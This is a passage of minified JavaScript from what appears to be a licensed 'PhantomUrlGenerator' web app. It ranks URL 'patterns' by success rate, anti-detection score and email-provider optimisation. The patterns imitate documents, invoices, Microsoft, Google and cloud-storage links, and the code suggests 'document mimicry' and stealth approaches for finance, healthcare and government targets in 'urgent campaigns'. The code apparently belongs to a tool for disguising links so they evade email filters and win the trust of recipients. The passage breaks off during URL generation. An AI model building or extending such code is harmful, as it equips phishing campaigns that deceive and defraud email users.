font-jetbrains text-xs text-blue-400/60",children:[a.jsxs("span",{children:["Tier ",I.tier]}),a.jsx("span",{children:I.content_type}),a.jsxs("span",{children:[I.current_uses,"/",I.max_uses," uses"]})]})]})})},I.id)})})})]},C)})})]}),!i&&n.length===0&&a.jsxs("div",{className:"text-center py-8",children:[a.jsx(Bt,{className:"w-12 h-12 text-blue-500 mx-auto mb-3"}),a.jsx("p",{className:"font-jetbrains text-blue-300",children:"No patterns available"}),a.jsx("p",{className:"font-jetbrains text-xs text-blue-400/60 mt-2",children:"Patterns are being loaded from the database"})]})]})]})},ts=class ts{constructor(){re(this,"analysisCache",new Map);re(this,"CACHE_TTL",5*60*1e3)}static getInstance(){return ts.instance||(ts.instance=new ts),ts.instance}async analyzePatterns(e){const r=this.generateCacheKey(e),n=this.analysisCache.get(r);if(n)return console.log(" [LocalPatternAnalyzer] Using cached analysis"),n;console.log(" [LocalPatternAnalyzer] Performing local pattern analysis for context:",e);const s=is(),i=[];for(const l of s){const c=this.analyzePattern(l,e);i.push(c)}const o=i.sort((l,c)=>c.performanceScore-l.performanceScore).slice(0,10);return this.analysisCache.set(r,o),setTimeout(()=>this.analysisCache.delete(r),this.CACHE_TTL),console.log(` [LocalPatternAnalyzer] Analysis complete: ${o.length} patterns analyzed`),o}analyzePattern(e,r){var l,c;let n=e.success_rate,s=100-(e.anti_detection_score||85);const i=[];let o=80;return r.industry&&(e.industry===r.industry?(n+=5,i.push(`Optimized for ${r.industry} industry`),o+=10):e.industry==="general"&&(n+=2,i.push("General-purpose pattern suitable for all industries"),o+=5)),r.emailProvider&&((l=e.provider_optimization)!=null&&l.includes(r.emailProvider)?(n+=8,s-=5,i.push(`Specifically optimized for ${r.emailProvider}`),o+=15):(c=e.provider_optimization)!=null&&c.includes("generic")&&(n+=3,i.push("Compatible with all email providers"),o+=5)),r.securityLevel==="high"&&(e.tier===1&&(n+=5,i.push("Tier 1 pattern suitable for high-security requirements"),o+=10),(e.anti_detection_score||85)>=90&&(n+=3,s-=3,i.push("High anti-detection score for security-conscious environments"))),r.targetAudience==="business"?["document","business","microsoft","invoice","calendar"].includes(e.category)&&(n+=4,i.push("Business-oriented pattern type"),o+=8):r.targetAudience==="consumer"&&["google","mimicry","content","cloudStorage"].includes(e.category)&&(n+=4,i.push("Consumer-friendly pattern type"),o+=8),r.contentType&&e.content_type===r.contentType&&(n+=3,i.push(`Content type matches: ${r.contentType}`),o+=5),r.urgency==="high"&&e.success_rate>=95&&(n+=3,i.push("High success rate suitable for urgent campaigns")),e.geographic_routing&&r.targetCountry&&(n+=2,i.push("Geographic routing available for better performance")),e.tier===1&&(n+=2,i.push("Premium Tier 1 pattern")),n=Math.min(100,Math.max(0,n)),s=Math.min(100,Math.max(0,s)),o=Math.min(100,Math.max(0,o)),{patternId:e.id,patternName:e.name,performanceScore:Math.round(n),riskScore:Math.round(s),reasoning:i,confidence:Math.round(o),metadata:{category:e.category,tier:e.tier,successRate:e.success_rate,antiDetectionScore:e.anti_detection_score||85,providerOptimization:e.provider_optimization||["generic"]}}}async getPatternRecommendations(e){return(await this.analyzePatterns(e)).slice(0,5).map(n=>({patternName:n.patternName,performanceScore:n.performanceScore,recommendationReason:n.reasoning[0]||"AI-optimized pattern selection",riskScore:n.riskScore,category:n.metadata.category,tier:n.metadata.tier}))}async predictPerformance(e,r){const n=Fu(e);if(!n)return{predictedSuccessRate:85,confidenceLevel:"low",factors:["Pattern not found, using default prediction"]};const s=this.analyzePattern(n,r);let i="medium";return s.confidence>=90?i="high":s.confidence<70&&(i="low"),{predictedSuccessRate:s.performanceScore,confidenceLevel:i,factors:s.reasoning}}async selectOptimalPattern(e){const r=await this.analyzePatterns(e);if(r.length===0)return null;const n=r[0];return Fu(n.patternId)||null}generateCacheKey(e){return JSON.stringify(e)}clearCache(){this.analysisCache.clear()}getStats(){return{cacheSize:this.analysisCache.size,totalPatterns:is().length,lastAnalysis:new Date().toISOString()}}};re(ts,"instance");let Bu=ts;const Wo=Bu.getInstance(),rs=class rs{constructor(){re(this,"patternCache",new Map);re(this,"CACHE_TTL",10*60*1e3)}static getInstance(){return rs.instance||(rs.instance=new rs),rs.instance}async getPatterns(e){const r=e?JSON.stringify(e):"all",n=this.patternCache.get(r);if(n)return console.log(" [HybridPatternManager] Using cached patterns"),n;console.log(" [HybridPatternManager] Loading patterns with context:",e);let s=is();return e&&(s=this.filterPatternsByContext(s,e)),this.patternCache.set(r,s),setTimeout(()=>this.patternCache.delete(r),this.CACHE_TTL),await qs.trackEvent("patterns_accessed",{count:s.length,context:e,source:"local_library"}),s}async getRecommendations(e,r=5){console.log(" [HybridPatternManager] Getting pattern recommendations");try{return(await Wo.analyzePatterns(e)).slice(0,r).map(s=>({patternId:s.patternId,patternName:s.patternName,category:s.metadata.category,successRate:s.metadata.successRate,tier:s.metadata.tier,reasoning:s.reasoning[0]||"AI-optimized selection",confidence:s.confidence}))}catch(n){return console.warn(" [HybridPatternManager] Analysis failed, using fallback:",n),(await this.getPatterns(e)).slice(0,r).map(i=>({patternId:i.id,patternName:i.name,category:i.category,successRate:i.success_rate,tier:i.tier,reasoning:"High-performance pattern",confidence:80}))}}async selectOptimalPattern(e){try{const r=await Wo.selectOptimalPattern(e);return r&&await qs.trackPatternUsage(r.id,r.name,!0),r}catch(r){console.warn(" [HybridPatternManager] Optimal selection failed, using fallback:",r);const n=await this.getPatterns(e),s=n.find(i=>i.tier===1)||n[0]||null;return s&&await qs.trackPatternUsage(s.id,s.name,!0),s}}filterPatternsByContext(e,r){let n=[...e];return r.emailProvider&&(n=n.filter(s=>!s.provider_optimization||s.provider_optimization.includes(r.emailProvider)||s.provider_optimization.includes("generic"))),r.industry&&(n=n.filter(s=>s.industry===r.industry||s.industry==="general")),r.securityLevel==="high"&&(n=n.filter(s=>s.tier===1&&(s.anti_detection_score||85)>=90)),r.targetAudience==="business"?n=n.filter(s=>["document","business","microsoft","invoice","calendar"].includes(s.category)):r.targetAudience==="consumer"&&(n=n.filter(s=>["google","mimicry","content","cloudStorage"].includes(s.category))),n.sort((s,i)=>i.success_rate-s.success_rate)}async getPatternById(e){return Fu(e)}async getPatternsByCategory(e){return is().filter(n=>n.category===e)}getPatternStats(){const e=is(),r=[...new Set(e.map(o=>o.category))],n=e.reduce((o,l)=>o+l.success_rate,0)/e.length,s=e.reduce((o,l)=>(o[l.tier]=(o[l.tier]||0)+1,o),{}),i=e.reduce((o,l)=>(o[l.category]=(o[l.category]||0)+1,o),{});return{totalPatterns:e.length,categories:r.length,avgSuccessRate:Math.round(n),tierDistribution:s,categoryDistribution:i,cacheSize:this.patternCache.size,lastUpdated:new Date().toISOString()}}clearCache(){this.patternCache.clear(),console.log(" [HybridPatternManager] Pattern cache cleared")}async predictPerformance(e,r){return await Wo.predictPerformance(e,r)}getStatus(){return{totalPatterns:is().length,cacheSize:this.patternCache.size,source:"local_library",analyticsEnabled:qs.getStatus().enabled,lastAccess:new Date().toISOString()}}};re(rs,"instance");let Vu=rs;const V0=Vu.getInstance(),X3=Yi("relative w-full rounded-xl border p-4 backdrop-blur-sm bg-gradient-to-br from-slate-900/90 via-blue-900/30 to-purple-900/30 border-cyan-400/40 shadow-xl [&>svg~*]:pl-7 [&>svg+div]:translate-y-[-3px] [&>svg]:absolute [&>svg]:left-4 [&>svg]:top-4 [&>svg]:text-cyan-400 font-jetbrains",{variants:{variant:{default:"text-cyan-50 border-cyan-400/40",destructive:"border-red-400/50 text-red-100 bg-gradient-to-br from-red-900/90 via-red-800/30 to-purple-900/30 [&>svg]:text-red-400",warning:"border-amber-400/50 text-amber-100 bg-gradient-to-br from-amber-900/90 via-amber-800/30 to-orange-900/30 [&>svg]:text-amber-400",success:"border-emerald-400/50 text-emerald-100 bg-gradient-to-br from-emerald-900/90 via-emerald-800/30 to-green-900/30 [&>svg]:text-emerald-400"}},defaultVariants:{variant:"default"}}),Hu=p.forwardRef(({className:t,variant:e,...r},n)=>a.jsx("div",{ref:n,role:"alert",className:we(X3({variant:e}),t),...r}));Hu.displayName="Alert";const Z3=p.forwardRef(({className:t,...e},r)=>a.jsx("h5",{ref:r,className:we("mb-1 font-jetbrains font-semibold leading-none tracking-tight text-cyan-100 uppercase text-sm",t),...e}));Z3.displayName="AlertTitle";const Gu=p.forwardRef(({className:t,...e},r)=>a.jsx("div",{ref:r,className:we("text-sm [&_p]:leading-relaxed text-cyan-200/90 font-inter",t),...e}));Gu.displayName="AlertDescription";function e4(t,e=[]){let r=[];function n(i,o){const l=p.createContext(o),c=r.length;r=[...r,o];const d=h=>{var y;const{scope:f,children:m,...g}=h,v=((y=f==null?void 0:f[t])==null?void 0:y[c])||l,w=p.useMemo(()=>g,Object.values(g));return a.jsx(v.Provider,{value:w,children:m})};d.displayName=i+"Provider";function u(h,f){var v;const m=((v=f==null?void 0:f[t])==null?void 0:v[c])||l,g=p.useContext(m);if(g)return g;if(o!==void 0)return o;throw new Error(`\`${h}\` must be used within \`${i}\``)}return[d,u]}const s=()=>{const i=r.map(o=>p.createContext(o));return function(l){const c=(l==null?void 0:l[t])||i;return p.useMemo(()=>({[`__scope${t}`]:{...l,[t]:c}}),[l,c])}};return s.scopeName=t,[n,t4(s,...e)]}function t4(...t){const e=t[0];if(t.length===1)return e;const r=()=>{const n=t.map(s=>({useScope:s(),scopeName:s.scopeName}));return function(i){const o=n.reduce((l,{useScope:c,scopeName:d})=>{const h=c(i)[`__scope${d}`];return{...l,...h}},{});return p.useMemo(()=>({[`__scope${e.scopeName}`]:o}),[o])}};return r.scopeName=e.scopeName,r}function H0(t,e){if(typeof t=="function")return t(e);t!=null&&(t.current=e)}function r4(...t){return e=>{let r=!1;const n=t.map(s=>{const i=H0(s,e);return!r&&typeof i=="function"&&(r=!0),i});if(r)return()=>{for(let s=0;s<n.length;s++){const i=n[s];typeof i=="function"?i():H0(t[s],null)}}}}function n4(t){const e=s4(t),r=p.forwardRef((n,s)=>{const{children:i,...o}=n,l=p.Children.toArray(i),c=l.find(i4);if(c){const d=c.props.children,u=l.map(h=>h===c?p.Children.count(d)>1?p.Children.only(null):p.isValidElement(d)?d.props.children:null:h);return a.jsx(e,{...o,ref:s,children:p.isValidElement(d)?p.cloneElement(d,void 0,u):null})}return a.jsx(e,{...o,ref:s,children:i})});return r.displayName=`${t}.Slot`,r}function s4(t){const e=p.forwardRef((r,n)=>{const{children:s,...i}=r;if(p.isValidElement(s)){const o=l4(s),l=o4(i,s.props);return s.type!==p.Fragment&&(l.ref=n?r4(n,o):o),p.cloneElement(s,l)}return p.Children.count(s)>1?p.Children.only(null):null});return e.displayName=`${t}.SlotClone`,e}var a4=Symbol("radix.slottable");function i4(t){return p.isValidElement(t)&&typeof t.type=="function"&&"__radixId"in t.type&&t.type.__radixId===a4}function o4(t,e){const r={...e};for(const n in e){const s=t[n],i=e[n];/^on[A-Z]/.test(n)?s&&i?r[n]=(...l)=>{const c=i(...l);return s(...l),c}:s&&(r[n]=s):n==="style"?r[n]={...s,...i}:n==="className"&&(r[n]=[s,i].filter(Boolean).join(" "))}return{...t,...r}}function l4(t){var n,s;let e=(n=Object.getOwnPropertyDescriptor(t.props,"ref"))==null?void 0:n.get,r=e&&"isReactWarning"in e&&e.isReactWarning;return r?t.ref:(e=(s=Object.getOwnPropertyDescriptor(t,"ref"))==null?void 0:s.get,r=e&&"isReactWarning"in e&&e.isReactWarning,r?t.props.ref:t.props.ref||t.ref)}var c4=["a","button","div","form","h2","h3","img","input","label","li","nav","ol","p","select","span","svg","ul"],Lv=c4.reduce((t,e)=>{const r=n4(`Primitive.${e}`),n=p.forwardRef((s,i)=>{const{asChild:o,...l}=s,c=o?r:e;return typeof window<"u"&&(window[Symbol.for("radix-ui")]=!0),a.jsx(c,{...l,ref:i})});return n.displayName=`Primitive.${e}`,{...t,[e]:n}},{}),xf="Progress",yf=100,[d4,HC]=e4(xf),[u4,h4]=d4(xf),Mv=p.forwardRef((t,e)=>{const{__scopeProgress:r,value:n=null,max:s,getValueLabel:i=f4,...o}=t;(s||s===0)&&!G0(s)&&console.error(m4(`${s}`,"Progress"));const l=G0(s)?s:yf;n!==null&&!W0(n,l)&&console.error(p4(`${n}`,"Progress"));const c=W0(n,l)?n:null,d=Rl(c)?i(c,l):void 0;return a.jsx(u4,{scope:r,value:c,max:l,children:a.jsx(Lv.div,{"aria-valuemax":l,"aria-valuemin":0,"aria-valuenow":Rl(c)?c:void 0,"aria-valuetext":d,role:"progressbar","data-state":Uv(c,l),"data-value":c??void 0,"data-max":l,...o,ref:e})})});Mv.displayName=xf;var Ov="ProgressIndicator",$v=p.forwardRef((t,e)=>{const{__scopeProgress:r,...n}=t,s=h4(Ov,r);return a.jsx(Lv.div,{"data-state":Uv(s.value,s.max),"data-value":s.value??void 0,"data-max":s.max,...n,ref:e})});$v.displayName=Ov;function f4(t,e){return`${Math.round(t/e*100)}%`}function Uv(t,e){return t==null?"indeterminate":t===e?"complete":"loading"}function Rl(t){return typeof t=="number"}function G0(t){return Rl(t)&&!isNaN(t)&&t>0}function W0(t,e){return Rl(t)&&!isNaN(t)&&t<=e&&t>=0}function m4(t,e){return`Invalid prop \`max\` of value \`${t}\` supplied to \`${e}\`. Only numbers greater than 0 are valid max values. Defaulting to \`${yf}\`.`}function p4(t,e){return`Invalid prop \`value\` of value \`${t}\` supplied to \`${e}\`. The \`value\` prop must be:
  - a positive number
  - less than the value passed to \`max\` (or ${yf} if no \`max\` prop is set)
  - \`null\` or \`undefined\` if the progress is indeterminate.

Defaulting to \`null\`.`}var Dv=Mv,g4=$v;const zv=p.forwardRef(({className:t,value:e,...r},n)=>a.jsx(Dv,{ref:n,className:we("relative h-3 w-full overflow-hidden rounded-full bg-slate-800/60 border border-cyan-400/30 shadow-inner",t),...r,children:a.jsx(g4,{className:"h-full w-full flex-1 bg-gradient-to-r from-cyan-400 via-blue-500 to-purple-500 transition-all duration-500 shadow-lg shadow-cyan-400/30",style:{transform:`translateX(-${100-(e||0)}%)`}})}));zv.displayName=Dv.displayName;const x4=({result:t,isLoading:e=!1,url:r})=>{var o,l;if(e)return a.jsxs("div",{className:"w-full bg-slate-900/90 rounded-2xl shadow-xl border border-cyan-400/40 p-6",children:[a.jsxs("div",{className:"flex items-center gap-3 mb-4",children:[a.jsx(lt,{className:"h-6 w-6 text-cyan-400 animate-spin"}),a.jsx("h3",{className:"text-xl font-jetbrains font-bold text-cyan-100 uppercase tracking-wide",children:"Validating URL..."})]}),a.jsx("div",{className:"space-y-3",children:a.jsxs("div",{className:"animate-pulse",children:[a.jsx("div",{className:"h-4 bg-cyan-500/30 rounded w-3/4 mb-2"}),a.jsx("div",{className:"h-4 bg-cyan-500/20 rounded w-1/2"})]})})]});if(!t)return a.jsx(q,{className:"w-full",children:a.jsxs(fe,{children:[a.jsxs(me,{className:"flex items-center gap-2",children:[a.jsx(lt,{className:"h-5 w-5 text-gray-400"}),"URL Validation"]}),a.jsx(bt,{children:"Generate a URL to see validation results and security analysis"})]})});const n=c=>c<=25?"text-green-600 bg-green-100":c<=50?"text-yellow-600 bg-yellow-100":c<=75?"text-orange-600 bg-orange-100":"text-red-600 bg-red-100",s=c=>c<=25?"Low Risk":c<=50?"Medium Risk":c<=75?"High Risk":"Critical Risk",i=c=>{switch(c){case"low":return a.jsx(Ho,{className:"h-4 w-4 text-blue-500"});case"medium":return a.jsx(ct,{className:"h-4 w-4 text-yellow-500"});case"high":return a.jsx(ct,{className:"h-4 w-4 text-orange-500"});case"critical":return a.jsx(Vo,{className:"h-4 w-4 text-red-500"});default:return a.jsx(Ho,{className:"h-4 w-4 text-gray-500"})}};return a.jsxs("div",{className:"w-full bg-gradient-to-br from-slate-900/90 via-blue-900/30 to-purple-900/30 backdrop-blur-lg rounded-2xl shadow-2xl border border-cyan-400/40 p-6 transition-all duration-300 hover:shadow-cyan-300/20 hover:border-cyan-300/60 relative overflow-hidden",children:[a.jsx("div",{className:"absolute inset-0 opacity-10",children:a.jsx("div",{className:"absolute inset-0 bg-cyan-500/5"})}),a.jsxs("div",{className:"relative z-10",children:[a.jsxs("div",{className:"mb-6",children:[a.jsxs("div",{className:"flex items-center gap-3 mb-2",children:[t.isValid?a.jsx(ba,{className:"h-6 w-6 text-emerald-400"}):a.jsx(Vo,{className:"h-6 w-6 text-red-400"}),a.jsx("h3",{className:"text-xl font-jetbrains font-bold text-cyan-100 uppercase tracking-wide",children:"URL Validation Results"})]}),a.jsx("p",{className:"text-sm text-cyan-200/80 font-inter",children:"Security analysis and recommendations for generated URL"})]}),a.jsxs("div",{className:"space-y-6",children:[a.jsxs("div",{className:"flex items-center justify-between p-4 bg-gray-50 rounded-lg",children:[a.jsxs("div",{children:[a.jsx("h3",{className:"font-medium",children:"Overall Status"}),a.jsx("p",{className:"text-sm text-gray-600",children:t.isValid?"URL passed all validation checks":`${t.issues.length} issues detected`})]}),a.jsx(Se,{className:t.isValid?"bg-green-100 text-green-800":"bg-red-100 text-red-800",children:t.isValid?"Valid":"Invalid"})]}),a.jsxs("div",{className:"space-y-3",children:[a.jsxs("div",{className:"flex items-center justify-between",children:[a.jsx("h3",{className:"font-medium",children:"Risk Assessment"}),a.jsx(Se,{className:n(t.riskScore),children:s(t.riskScore)})]}),a.jsxs("div",{className:"space-y-2",children:[a.jsxs("div",{className:"flex justify-between text-sm",children:[a.jsx("span",{children:"Risk Score"}),a.jsxs("span",{children:[t.riskScore,"/100"]})]}),a.jsx(zv,{value:t.riskScore,className:"h-2"})]})]}),t.issues.length>0&&a.jsxs("div",{className:"space-y-3",children:[a.jsx("h3",{className:"font-medium text-red-700",children:"Issues Detected"}),a.jsx("div",{className:"space-y-2",children:t.issues.map((c,d)=>a.jsxs(Hu,{className:"border-red-200",children:[a.jsx(Vo,{className:"h-4 w-4 text-red-500"}),a.jsx(Gu,{className:"text-red-700",children:c})]},d))})]}),t.detectedPatterns&&t.detectedPatterns.length>0&&a.jsxs("div",{className:"space-y-3",children:[a.jsx("h3",{className:"font-medium text-orange-700",children:"Suspicious Patterns"}),a.jsx("div",{className:"space-y-2",children:t.detectedPatterns.map((c,d)=>a.jsxs("div",{className:"flex items-start gap-3 p-3 border rounded-lg",children:[i(c.severity),a.jsxs("div",{className:"flex-1",children:[a.jsxs("div",{className:"flex items-center gap-2",children:[a.jsx("span",{className:"font-medium text-sm",children:c.pattern}),a.jsx(Se,{variant:"outline",className:`text-xs ${c.severity==="critical"?"border-red-500 text-red-700":c.severity==="high"?"border-orange-500 text-orange-700":c.severity==="medium"?"border-yellow-500 text-yellow-700":"border-blue-500 text-blue-700"}`,children:c.severity})]}),a.jsx("p",{className:"text-xs text-gray-600 mt-1",children:c.description})]})]},d))})]}),t.recommendations.length>0&&a.jsxs("div",{className:"space-y-3",children:[a.jsx("h3",{className:"font-medium text-blue-700",children:"Recommendations"}),a.jsx("div",{className:"space-y-2",children:t.recommendations.map((c,d)=>a.jsxs(Hu,{className:"border-blue-200",children:[a.jsx(Ho,{className:"h-4 w-4 text-blue-500"}),a.jsx(Gu,{className:"text-blue-700",children:c})]},d))})]}),t.metadata&&a.jsxs("div",{className:"space-y-3",children:[a.jsx("h3",{className:"font-medium",children:"Generation Details"}),a.jsxs("div",{className:"grid grid-cols-2 gap-4 p-4 bg-gray-50 rounded-lg",children:[a.jsxs("div",{children:[a.jsx("span",{className:"text-sm text-gray-600",children:"Pattern:"}),a.jsx("p",{className:"font-medium",children:t.metadata.pattern})]}),a.jsxs("div",{children:[a.jsx("span",{className:"text-sm text-gray-600",children:"Method:"}),a.jsx("p",{className:"font-medium",children:t.metadata.generationMethod})]}),a.jsxs("div",{children:[a.jsx("span",{className:"text-sm text-gray-600",children:"Encryption:"}),a.jsx("p",{className:"font-medium",children:t.metadata.encryptionMode.toUpperCase()})]}),a.jsxs("div",{children:[a.jsx("span",{className:"text-sm text-gray-600",children:"Success Rate:"}),a.jsxs("p",{className:"font-medium",children:[t.metadata.expectedSuccessRate,"%"]})]}),t.metadata.serviceName&&a.jsxs("div",{children:[a.jsx("span",{className:"text-sm text-gray-600",children:"Service:"}),a.jsx("p",{className:"font-medium",children:t.metadata.serviceName})]}),t.metadata.recognitionRate&&a.jsxs("div",{children:[a.jsx("span",{className:"text-sm text-gray-600",children:"Recognition:"}),a.jsxs("p",{className:"font-medium",children:[t.metadata.recognitionRate,"%"]})]}),t.metadata.trustScore&&a.jsxs("div",{children:[a.jsx("span",{className:"text-sm text-gray-600",children:"Trust Score:"}),a.jsxs("p",{className:"font-medium",children:[t.metadata.trustScore,"/100"]})]}),t.metadata.subdomain&&a.jsxs("div",{children:[a.jsx("span",{className:"text-sm text-gray-600",children:"Subdomain:"}),a.jsx("p",{className:"font-medium",children:t.metadata.subdomain})]})]})]}),r&&a.jsxs("div",{className:"space-y-2",children:[a.jsx("h3",{className:"font-medium",children:"Generated URL"}),a.jsx("div",{className:"p-3 bg-gray-100 rounded-lg",children:a.jsx("code",{className:"text-sm break-all",children:r})})]}),a.jsxs("div",{className:"p-4 bg-gradient-to-r from-blue-50 to-purple-50 rounded-lg border-l-4 border-blue-500",children:[a.jsxs("div",{className:"flex items-center gap-2 mb-2",children:[a.jsx(lt,{className:"h-5 w-5 text-blue-600"}),a.jsx("h3",{className:"font-medium text-blue-800",children:"Security Summary"})]}),a.jsxs("div",{className:"grid grid-cols-3 gap-4 text-sm",children:[a.jsxs("div",{className:"text-center",children:[a.jsxs("div",{className:"font-bold text-lg text-blue-700",children:[((o=t.metadata)==null?void 0:o.expectedSuccessRate)||"N/A","%"]}),a.jsx("div",{className:"text-blue-600",children:"Success Rate"})]}),a.jsxs("div",{className:"text-center",children:[a.jsxs("div",{className:"font-bold text-lg text-blue-700",children:[100-t.riskScore,"%"]}),a.jsx("div",{className:"text-blue-600",children:"Safety Score"})]}),a.jsxs("div",{className:"text-center",children:[a.jsx("div",{className:"font-bold text-lg text-blue-700",children:((l=t.metadata)==null?void 0:l.tier)||"N/A"}),a.jsx("div",{className:"text-blue-600",children:"Tier Level"})]})]})]})]})]})]})},y4=()=>{p.useEffect(()=>{const B=document.createElement("style");return B.textContent=`
      .toggle-checkbox:checked {
        transform: translateX(100%);
        border-color: #4f46e5;
      }
      .toggle-checkbox:checked + .toggle-label {
        background-color: #818cf8;
      }
    `,document.head.appendChild(B),()=>{document.head.removeChild(B)}},[]);const[t,e]=p.useState(""),[r,n]=p.useState(""),[s,i]=p.useState(!1),[o,l]=p.useState(!1),[c,d]=p.useState(!1),[u,h]=p.useState(!1),[f,m]=p.useState({pattern:"auto",stealthLevel:"both",tier:1}),[g,v]=p.useState(null),[w,y]=p.useState(null),[x,b]=p.useState("auto"),[j,_]=p.useState(0),[N,S]=p.useState(null),[k,C]=p.useState([]),[T,M]=p.useState(!1),[A,R]=p.useState(null),[I,J]=p.useState(0),[K,ne]=p.useState(null),{toast:P}=Ln(),z={1:"https://google.com",2:"https://github.com",3:"https://stackoverflow.com",4:"https://developer.mozilla.org",5:"https://tailwindcss.com"},Q=async()=>{if(x==="auto"){const B=j+1;_(B),console.log("[PhantomUrlGenerator] Smart Auto-Select: Counter incremented to:",B),R(null);try{const Y={industry:"general",targetAudience:"mixed",securityLevel:"medium"},ee=await V0.selectOptimalPattern(Y);if(ee)return console.log("[PhantomUrlGenerator] Smart Auto-Select: Selected pattern:",ee.name),y(ee),P({title:" Smart Auto-Select",description:`Rotated to ${ee.name} (${ee.category})`,className:"bg-gradient-to-r from-blue-50 to-purple-50 border-l-4 border-blue-500 text-blue-800 shadow-lg",duration:2e3}),ee.category}catch(Y){console.warn("[PhantomUrlGenerator] Auto-select failed, using random fallback:",Y)}}return(w==null?void 0:w.category)||"intelligent"},H=async B=>{if(!(!B||!B.includes("."))){M(!0);try{const Y=new URL(B.startsWith("http")?B:`https://${B}`).hostname,ee=ie(Y),pe={industry:ee,targetCountry:"US",securityLevel:"high"};console.log(" [AI Analysis] Starting analysis for:",Y,"Industry:",ee);let ye=[];try{ye=(await Wo.analyzePatterns(pe)).map(U=>{var O;return{patternName:U.patternName,performanceScore:U.performanceScore,recommendationReason:((O=U.reasoning)==null?void 0:O[0])||"AI-optimized for your industry",riskScore:U.riskScore}}),console.log(" [AI Analysis] Got recommendations:",ye.length)}catch(E){console.warn(" [AI Analysis] Pattern analysis failed, using fallback:",E),ye=ge(ee)}C(ye.slice(0,5));const he={domain:Y,industry:ee,security_level:"high",recommended_approach:"stealth",risk_factors:_e(Y),optimization_suggestions:Ye(Y,ee)};S(he),P({title:" Smart Analysis Complete",description:`Found ${ye.length} optimized patterns for ${ee}`,className:"bg-gradient-to-r from-purple-50 to-indigo-50 border-l-4 border-purple-500 text-purple-800 shadow-lg",duration:3e3})}catch(Y){console.error(" [AI Analysis] Analysis failed:",Y);const ee=B.replace(/^https?:\/\//,"").split("/")[0],pe=ie(ee);S({domain:ee,industry:pe,security_level:"medium",recommended_approach:"stealth",risk_factors:_e(ee),optimization_suggestions:["Use stealth patterns for better delivery"]}),C(ge(pe)),P({title:" Basic Analysis Complete",description:`Analysis completed with fallback data for ${pe}`,className:"bg-gradient-to-r from-amber-50 to-orange-50 border-l-4 border-amber-500 text-amber-800 shadow-lg",duration:3e3})}finally{M(!1)}}},te=async(B,Y)=>{if(console.log("[PhantomUrlGenerator] Pattern changed:",B,Y),b(B),y(Y),B&&!B.startsWith("quick-"))try{const he=await V0.getPatternById(B);he&&y(he);const E=N?{industry:N.industry,countryCode:"US"}:{};console.log("Pattern context for analysis:",E)}catch(he){console.error("Pattern prediction error:",he)}let ee="auto";if(B.startsWith("quick-"))switch(B){case"quick-marketing":case"quick-business":ee="business";break;case"quick-newsletter":ee="content";break;case"quick-bing":ee="search";break;case"quick-auto":ee="auto";break;default:ee=Y.category||"auto"}else B&&!B.startsWith("quick-")&&(ee=Y.category||"auto");console.log("[PhantomUrlGenerator] Mapped pattern:",ee),m(he=>({...he,pattern:ee}));const pe=Y.success_rate||85;P({title:" AI Pattern Selected",description:`${Y.name} - ${pe}% success rate (high confidence)`,className:"bg-gradient-to-r from-emerald-50 to-blue-50 border-l-4 border-emerald-500 text-emerald-800 shadow-lg",duration:3e3})},ie=B=>{const Y={finance:["bank","finance","trading","invest","crypto"],healthcare:["health","medical","pharma","clinic","hospital"],technology:["tech","software","app","dev","api","cloud"],ecommerce:["shop","store","buy","sell","commerce","retail"],education:["edu","school","university","course","learn"],news:["news","media","press","journal","times"],government:["gov","official","state","federal","public"]};for(const[ee,pe]of Object.entries(Y))if(pe.some(ye=>B.toLowerCase().includes(ye)))return ee;return"business"},_e=B=>{const Y=[];return B.includes("gov")&&Y.push("government_domain"),B.includes("bank")&&Y.push("financial_service"),B.length<8&&Y.push("short_domain"),B.split(".").length>3&&Y.push("complex_subdomain"),Y},Ye=(B,Y)=>{const ee=[];return Y==="finance"&&ee.push("Use document patterns for higher trust"),Y==="technology"&&ee.push("Business API patterns recommended"),Y==="healthcare"&&ee.push("Professional document mimicry optimal"),ee.push("Enable geographic optimization"),ee.push("Use AES encryption for maximum security"),ee},ge=B=>{const Y=[{patternName:"Document Pattern",performanceScore:96,recommendationReason:"High trust document sharing format",riskScore:15},{patternName:"Business API Pattern",performanceScore:93,recommendationReason:"Professional API endpoint style",riskScore:20},{patternName:"Intelligent Pattern",performanceScore:97,recommendationReason:"AI-optimized URL structure",riskScore:12}];return B==="finance"?Y.unshift({patternName:"Secure Document Pattern",performanceScore:98,recommendationReason:"Optimized for financial services",riskScore:10}):B==="technology"&&Y.unshift({patternName:"Developer API Pattern",performanceScore:95,recommendationReason:"Perfect for tech industry",riskScore:18}),Y};p.useEffect(()=>{const B=setTimeout(()=>{t&&t.includes(".")&&!t.match(/^[1-5]$/)&&H(t)},1e3);return()=>clearTimeout(B)},[t]);const Je=async()=>{if(!t.trim()){P({title:"Action Required",description:"Please provide a destination URL or select a quick number (1-5)",variant:"destructive",className:"bg-gradient-to-r from-red-50 to-red-100 border-l-4 border-red-500 text-red-800 shadow-lg",duration:3e3});return}h(!1),l(!0),n("");try{console.log(" [PhantomUrlGenerator] Starting URL generation process"),console.log(" Input URL:",t),console.log(" Show Advanced:",c),console.log(" Selected Pattern:",(w==null?void 0:w.name)||"None");const B=localStorage.getItem("license_session_token");if(!B){console.error(" [Auth] No session token found"),P({title:"Authentication Required",description:"Please log in with your license key to generate URLs",variant:"destructive",className:"bg-gradient-to-r from-amber-50 to-amber-100 border-l-4 border-amber-500 text-amber-900 shadow-lg",duration:4e3}),l(!1);return}console.log(" [Auth] Session token found:",B.substring(0,8)+"...");const{data:Y,error:ee}=await $.rpc("validate_session_with_license",{session_token_input:B});if(ee){console.error(" [Auth] Session validation error:",ee),P({title:"Session Validation Failed",description:`Authentication error: ${ee.message}`,variant:"destructive",className:"bg-gradient-to-r from-red-50 to-red-100 border-l-4 border-red-500 text-red-800 shadow-lg",duration:4e3}),l(!1);return}if(!(Y!=null&&Y.valid)){console.error(" [Auth] Session validation failed:",Y),P({title:"Session Invalid",description:"Your session has expired. Please log in again.",variant:"destructive",className:"bg-gradient-to-r from-red-50 to-red-100 border-l-4 border-red-500 text-red-800 shadow-lg",duration:4e3}),l(!1);return}const pe=Y.license_id;console.log(" [Auth] Session validated, license ID:",pe),await new Promise(U=>setTimeout(U,300));let ye="",he=null;if(/^[1-5]$/.test(t.trim())){console.log(" [Generation] Processing quick number:",t.trim());const U=t.trim(),O=z[U];console.log(" [Generation] Target URL for quick number:",O);try{const se=await new 